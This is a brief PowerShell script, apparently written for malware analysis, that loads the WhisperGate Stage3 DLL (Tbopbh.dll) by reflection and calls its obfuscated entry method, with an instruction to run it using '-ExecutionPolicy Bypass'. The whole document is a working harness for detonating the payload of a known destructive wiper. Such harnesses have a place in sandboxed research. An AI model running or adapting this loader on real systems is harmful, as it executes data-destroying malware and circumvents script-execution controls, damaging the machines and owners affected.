#WhisperGate Stage3 Loader 9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d
#Execute using: powershell -ExecutionPolicy Bypass -File stage3.ps1 
Write-Output "[*] #WhisperGate Stage3 Loader Starting..."
$path = "<Your Path>\Tbopbh.dll"
Write-Output "[*] Path: $path"
Write-Output "[*] Loading DLL..."
[Reflection.Assembly]::LoadFile("$path")
Write-Output "[*] Executing Ylfwdwgmpilzyaph()..."
[ClassLibrary1.Main]::Ylfwdwgmpilzyaph()
